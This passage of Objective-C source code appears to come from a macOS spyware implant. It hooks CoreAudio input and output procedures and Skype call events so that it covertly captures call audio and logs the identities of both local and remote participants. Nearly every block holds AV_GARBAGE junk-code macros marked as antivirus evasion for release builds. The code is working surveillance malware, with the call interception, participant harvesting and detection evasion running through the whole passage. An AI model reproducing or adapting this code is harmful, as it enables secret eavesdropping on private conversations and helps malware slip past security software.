          AV_GARBAGE_006
          
        }
      else
        { 
        // AV evasion: only on release build
          AV_GARBAGE_008
        
          success = _real_AudioDeviceAddIOProc(inDevice, inProc, inClientData);
          
          // AV evasion: only on release build
          AV_GARBAGE_001
          
        }
    }
  else
    { 
      // AV evasion: only on release build
      AV_GARBAGE_006
    
      success = _real_AudioDeviceAddIOProc(inDevice, inProc, inClientData);
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
    }
  
  return success;
}

OSStatus
_hook_AudioDeviceRemoveIOProc (AudioDeviceID       inDevice,
                               AudioDeviceIOProc   inProc)
{
  OSStatus status;
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  
  //BOOL temp = NO;
  //[agentLock lock];
  //temp = gIsSkypeVoipAgentActive;
  //[agentLock unlock];

  if (gIsSkypeVoipAgentActive == YES)
    {
      if (inProc == _real_AudioDeviceIOProcInput)
        { 
          // AV evasion: only on release build
          AV_GARBAGE_000
        
          status = _real_AudioDeviceRemoveIOProc(inDevice, _hook_AudioDeviceIOProcInput);
        
          // AV evasion: only on release build
          AV_GARBAGE_003
        
          _real_AudioDeviceIOProcInput = 0;
          inputClientData = 0;
        }
      else if (inProc == _real_AudioDeviceIOProcOutput)
        {         
          // AV evasion: only on release build
          AV_GARBAGE_006
          
          status = _real_AudioDeviceRemoveIOProc(inDevice, _hook_AudioDeviceIOProcOutput);
          
          _real_AudioDeviceIOProcOutput = 0;
          outputClientData = 0;
        }
      else
        { 
          // AV evasion: only on release build
          AV_GARBAGE_003
        
          status = _real_AudioDeviceRemoveIOProc(inDevice, inProc);
        }
    }
  else
    { 
      // AV evasion: only on release build
      AV_GARBAGE_001
    
      status = _real_AudioDeviceRemoveIOProc(inDevice, inProc);
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  return status;
}


@implementation myEventController

- (void)handleNotificationHook: (id)arg1
{ 
  // AV evasion: only on release build
  AV_GARBAGE_006
  
#ifdef DEBUG_VOIP_SKYPE
  infoLog(@"Hooked with arg: %@", arg1);
#endif
  
  //NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  NSString *name = [arg1 name];
  BOOL shouldStart = NO;
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  //
  // Do this as fast as we can
  // So say we all
  //
  // XXX- versione 6.1x:
  if ([[arg1 name] isEqualToString: @"OutgoingCall"])//[name isEqualToString: @"CallConnecting"])
  { 
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    shouldStart = VPSkypeStartAgent();
  }
  if ([name isEqualToString: @"IncomingCall"])
  { 
    // AV evasion: only on release build
    AV_GARBAGE_004
    
    shouldStart = VPSkypeStartAgent();
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
#ifdef DEBUG_VOIP_SKYPE
  infoLog(@"Hooked with arg name: %@", [arg1 name]);
#endif
  // XXX- versione 6.1x:
  if ([[arg1 name] isEqualToString: @"OutgoingCall"] // [[arg1 name] isEqualToString: @"CallConnecting"]   // CallTo
      || [[arg1 name] isEqualToString: @"IncomingCall"]) // IncomingCall
  {
    // AV evasion: only on release build
    AV_GARBAGE_003
    
    //BOOL temp = NO;
    
    //[agentLock lock];
    //temp = gIsSkypeVoipAgentActive;
    //[agentLock unlock];
    
    // XXX- versione 6.1x:
    //if (shouldStart == YES)
    {     
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      //
      // Unfortunately from this method on we have 2 out procs registration
      // this means that there's a potential race where we won't
      // grab the output channel (first proc), echo cancellation might
      // serve as a workaround on this since the output channel is present
      // also in the input channel, but the potential problem remains
      //
      //[agentLock lock];
      //gIsSkypeVoipAgentActive   = YES;
      //gIsSkypeVoipAgentStopped  = NO;
      //[agentLock unlock];
      
      //usleep(500000);
      //VPSkypeStartAgent();
      
      //
      // Skype 5.x
      //
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      // [arg1 object] == SKConversation object
      id conversation = [arg1 object];
      
#ifdef DEBUG_VOIP_SKYPE
      infoLog(@"conversation: %@", conversation);
#endif
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      if ([conversation respondsToSelector: @selector(participants)])
      {
        NSArray *participants = [conversation performSelector: @selector(participants)];
#ifdef DEBUG_VOIP_SKYPE
        infoLog(@"Participants: %@", participants);
#endif
        // AV evasion: only on release build
        AV_GARBAGE_009
        
        int i = 0;
        NSString *peer = @"";
        if (gRemotePeerName == nil)
        {         
          // AV evasion: only on release build
          AV_GARBAGE_001
          
          [peerLock lock];
          gRemotePeerName = [[NSMutableString alloc] init];
          [peerLock unlock];
          
          // AV evasion: only on release build
          AV_GARBAGE_000
          
          if ([conversation respondsToSelector: @selector(myself)])
          { 
            // AV evasion: only on release build
            AV_GARBAGE_009
            
            id participant = [conversation performSelector: @selector(myself)];
#ifdef DEBUG_VOIP_SKYPE
            infoLog(@"participant: %@", participant);
#endif
            if ([participant respondsToSelector: @selector(identity)])
            { 
              // AV evasion: only on release build
              AV_GARBAGE_001
              
              peer = [participant performSelector: @selector(identity)];
#ifdef DEBUG_VOIP_SKYPE
              infoLog(@"peer: %@", peer);
#endif
              // AV evasion: only on release build
              AV_GARBAGE_002              
            }
            else
            {
#ifdef DEBUG_VOIP_SKYPE
              errorLog(@"Mmmh, something changes");
#endif
            }
          }
          else
          {
#ifdef DEBUG_VOIP_SKYPE
            errorLog(@"Mmmh, something changes");
#endif
          }
          
          [peerLock lock];
          [gRemotePeerName appendFormat: @"%@ ", peer]; 
  
          // AV evasion: only on release build
          AV_GARBAGE_001
          
          gLocalPeerName = [[NSMutableString alloc] initWithString: peer];
          [peerLock unlock];
        }
        
        for (; i < [participants count]; i++)
        { 
          // AV evasion: only on release build
          AV_GARBAGE_004
          
          // Holds SKParticipant objects
          id item = [participants objectAtIndex: i];
          
          // AV evasion: only on release build
          AV_GARBAGE_009
          
          if ([item respondsToSelector: @selector(identity)])
          {
            peer = [item performSelector: @selector(identity)];
            
            // AV evasion: only on release build
            AV_GARBAGE_003
            
            if ([peer isEqualToString: gLocalPeerName] == NO)
            {
              // AV evasion: only on release build
              AV_GARBAGE_006
              
              [peerLock lock];
              
              // AV evasion: only on release build
              AV_GARBAGE_002
              
              [gRemotePeerName appendFormat: @"%@ ", peer];
              
              // AV evasion: only on release build
              AV_GARBAGE_001
              
              [peerLock unlock];
            }
          }
          else
          {
#ifdef DEBUG_VOIP_SKYPE
            errorLog(@"Mmmh, something changes");
#endif
          }
        }
      }
    }
  }
  else if ([[arg1 name] isEqualToString: @"HangUp"])
  {
    //[agentLock lock];
    if (gIsSkypeVoipAgentActive == YES)
    {
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      VPSkypeStopAgent();
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
    }
    //[agentLock unlock];
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  [self handleNotificationHook: arg1];
  
  //[outerPool release];
}

@end

@implementation myMacCallX

- (void)answerHook
{
  // AV evasion: only on release build
  AV_GARBAGE_006
    
  gIsSkypeVoipAgentStopped = NO;
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  [self answerHook]; 
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  [self checkActiveMembersName]; 
  
  // AV evasion: only on release build
  AV_GARBAGE_003
}

- (uint)placeCallToHook: (id)arg1
{
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  gIsSkypeVoipAgentStopped = NO;
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  [NSThread detachNewThreadSelector: @selector(checkActiveMembersName)
                           toTarget: self
                         withObject: nil];

  return [self placeCallToHook: arg1];
}

- (void)checkActiveMembersName
{  
  // AV evasion: only on release build
  AV_GARBAGE_002
    
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  NSArray *remotePeers  = nil;
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  remotePeers = [self performSelector: @selector(callMemberIdentities)];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  if ([remotePeers isKindOfClass: [NSArray class]]
      && [remotePeers count] > 0)
  { 
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    [peerLock lock];
    if (gRemotePeerName == nil)
    { 
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      gLocalPeerName  = [[self performSelector: @selector(hostIdentity)] copy];
      gRemotePeerName = [[NSMutableString alloc] initWithString: gLocalPeerName];
    } 
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    int i = 0;
    for (; i < [remotePeers count]; i++)
    {
      NSString *peer = [remotePeers objectAtIndex: i];
      NSRange range = [gRemotePeerName rangeOfString: peer];
      
      if (range.location == NSNotFound)
      {
        // AV evasion: only on release build
        AV_GARBAGE_003
        
        [gRemotePeerName appendFormat: @", %@", peer];
        
        // AV evasion: only on release build
        AV_GARBAGE_001
      }
    }
    [peerLock unlock];
    
    
    // AV evasion: only on release build
    AV_GARBAGE_006    
  }
  
  [outerPool release];
}

- (BOOL)isFinishedHook
{
  // AV evasion: only on release build
  AV_GARBAGE_006
  

  BOOL success = [self isFinishedHook];

  if (success == YES)
    { 
      // AV evasion: only on release build
      AV_GARBAGE_006
    
      updateFlagForStopOperation();
    }

  return success;
}

@end
